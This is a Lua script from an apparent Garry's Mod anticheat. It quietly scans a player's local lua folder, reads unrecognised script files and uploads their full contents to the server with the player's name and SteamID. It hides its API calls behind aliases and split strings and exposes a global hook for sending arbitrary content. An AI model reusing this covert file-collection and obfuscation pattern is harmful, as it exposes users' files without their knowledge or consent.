
--Hax that hax you back!

local Useless = {
	"entities/",
	"entities ",
	"effects/",
	"weapons/",
	"Weapons/",
	"weapons_old/",
	"weaponsold/",
	"weaponsold1/",
	"weaponsold2/",
	"weaponsold3/",
	"includes/gamemode/",
	"includes/gamemodes/",
	"gamemodes/",
	"includes/lua/effects/",
	"includes/lua/entities/",
	"includes/lua/weapons/",
	"wire/",
	"autorun/server/AdvDupe",
	"autorun/shared/dupeshare",
	"slvbase_init/",
	"hlr_init/",
	"playx/",
	"pcmod/",
	"weaponsold/weapon_/",
	"weaponsold2/weapon_/",
	"stargate/",
	"achievements/",
	"CAF/Addons/",
	"CAF/Stools",
	"SPM/Commands/",
	"SPM/Plugins/",
	"rd2/stools/",
	"exsto/plugins/",
	"AVehicles/",
	"includes/entities/",
	"app_framework/controls/",
	"includes/weapons/",
	"lua/entities/",
	"lua/weapons/",
	"chatsounds/lists_nosend/",
	"chatsounds/lists_send/",
	"PewPewBullets/",
	"PewPewPlugins/",
	"CSS Realistic Weapons 4.0/",
	"autorun/entities/",
	"autorun/weapons/",
	"autorun/server/",
	"lua/autorun/server/",
}


local NotFR			= _G.NotFR
local NotFXE		= _G.NotFXE
local NotFFIL		= _G.NotFFIL
local NotFTF		= _G.NotFTF
local NotINC		= _G.NotINC
local NotRQ			= _G.NotRQ

local tostring		= tostring
local type			= type
local Format		= Format
local pairs			= pairs
local string		= string

local NotRCC		= RunConsoleCommand
local NotSYS		= SysTime
local NotSL			= string.lower
local NotSS			= string.sub
local NotTS			= timer.Simple
local NotCRC		= util.CRC


NotRQ("usermessage")
NotRQ("concommand")
NotRQ("hook")
NotRQ("timer")

local WhatDS		= "datas".."tream"
local WhatST		= "Stre".."amTo".."Server" --Eat shit and die
NotRQ(WhatDS)
local NotSTS		= _G[WhatDS][WhatST]
local NotSID		= _R["Player"]["SteamID"]

AllowedList		= nil
NotINC("lists/HAC_W_HKS.lua")
local NoSend	= AllowedList or {}
AllowedList		= nil

local WaitFor		= 0.6
local CheckTime		= #NoSend
local BootySpeed	= 2.5
local ToolCommand	= "gm_runtools"

local DEBUG = false --false

local IsDev = {
	["STEAM_0:0:17809124"]	= true, --HeX
	["STEAM_0:0:25307981"]	= true, --Blackwolf
	["STEAM_0:0:20180608"]	= true, --Chris
}

local FileExt = {
	["lua"]		= true,
	["bak"]		= true,
	["txt"]		= true,
	["old"]		= true,
	["lua2"]	= true,
}

local ToSend = {}
local Init	 = false

local function NotSRP(str,what,with)
	what = what:gsub("[%-%^%$%(%)%%%.%[%]%*%+%-%?]", "%%%1")
	with = with:gsub("%%", "%%%1")
	return ( str:gsub(what, with) )
end
local function NotGEX(path)
	return path:match("%.([^%.]+)$")
end
local function NotST(s,char)
	if (!char) then char = "%s" end
	return ( s:gsub("^"..char.."*(.-)"..char.."*$", "%1") )
end
local function ValidString(v)
	return (v and type(v) == "string" and v != "")
end

local function StringCheck(str,check)
	return str:sub(1,#check) == check
end
local function GimmeRand()
	return NotSRP(tostring( NotSYS() ), ".", "")
end

local function InPack(path)
	return not tobool( NotFR("lua/"..path, true) )
end
local function GetCRC(path)
	local Text = NotFR("lua/"..path,true) or ""
	if not ValidString(Text) then return "Gone" end
	
	return tostring( NotCRC(Text) ) or "Gone"
end


local function NotTHV(tab,val)
	val = NotSL(val)
	for k,v in pairs(tab) do
		if (NotSL(v) == val) then return true end
	end
	return false
end

local function IsUselessDir(SubName)
	for k,v in pairs(Useless) do
		if StringCheck(SubName,v) then
			return true
		end
	end
	return false
end


local function BootyChest(NewFile,NewSize,AllSize,CurSize)
	NotRCC(ToolCommand, NewFile, tostring(NewSize), tostring(AllSize), tostring(CurSize))
	
	NotSTS(tostring(CheckTime),
		{
			Name	 = NewFile,
			Size	 = NewSize,
			AllSize  = AllSize,
			IsBucket = false,
			
			Cont	 = Format("--[[\n\t%s\n\t%s\n\t===DStream===\n]]\n\n%s",
				NewFile,
				Format("%s | (%s)", LocalPlayer():Nick(), LocalPlayer():SteamID()),
				NotFR("lua/"..NewFile, true)
			),
		}
	)
end


local function LoadFromBuffer(what,where,files)
	what = NotST(what, "*")
	
	for k,SubFile in pairs(files) do
		local ext = NotGEX(SubFile)
		
		if FileExt[ext] then
			local SubName = what..SubFile
			SubName = NotSS(SubName, 5) --lua/
			
			if not IsUselessDir(SubName) and not NotTHV(ToSend, SubName) and not InPack(SubName) then
				table.insert(ToSend, SubName)
			end
		end
	end
	
	for k,dir in pairs(where) do
		NotFTF(what..dir.."/*", LoadFromBuffer)
	end
end


local function DoCheck()
	NotFTF("lua/*", LoadFromBuffer)
	
	NotTS(3, function()
		local Proper = {}
		
		for k,NewFile in pairs(ToSend) do
			local NewSize = tostring( GetCRC(NewFile) )
			
			if (#NotFFIL(NewFile) >= 1) then
				if not NotTHV(NoSend, Format("%s-%s", NewFile, NewSize)) then
					table.insert(Proper, {NewFile = NewFile, NewSize = NewSize,} )
				end
			end
		end
		
		
		for k,v in pairs(Proper) do
			NotTS(k / BootySpeed, function()
				BootyChest(v.NewFile, v.NewSize,#Proper,k)
			end)
		end
	end)
end

local function DoCheckBuff()
	if IsDev[ LocalPlayer():SteamID() ] then
		concommand.Add("hac_streamhks", DoCheck) --Damnit Discord
	else
		DoCheck()
	end
	if DEBUG then
		DoCheck()
	end
	NotSTS(tostring(CheckTime), {
			{
				TXOk	= CheckTime,
				TXList	= #NoSend,
				TXInit	= Init,
			},
		}
	)
end
NotTS(WaitFor, DoCheckBuff)


local ConstRand = GimmeRand()
local Prog = 2
local function BootyBucket(cont,name)
	if not ValidString(cont) then return end
	
	Prog = Prog + 1
	local NewFile = Format("%s-%s%s", (name or "BB"), (NotCRC(cont) or ConstRand), Prog)
	
	NotSTS(tostring(CheckTime),
		{
			Name	 = NewFile,
			Size	 = Prog,
			AllSize  = 1,
			IsBucket = true,
			
			Cont	 = Format("--[[\n\t%s\n\t%s\n\t===BootyBucket===\n]]\n\n%s",
				NewFile,
				Format("%s | (%s)", LocalPlayer():Nick(), LocalPlayer():SteamID()),
				cont
			),
		}
	)
end
local NotBBUF		= BootyBucket
_G["BootyBucket"]	= BootyBucket

local function CheckBBUF()
	if (_G["BootyBucket"] != NotBBUF) then
		NotRCC("hac_made_by_hex__initfail", "ICheck=Bucket")
		BootyBucket = NotBBUF
	end
	NotTS(2, CheckBBUF)
end
NotTS(1, CheckBBUF)





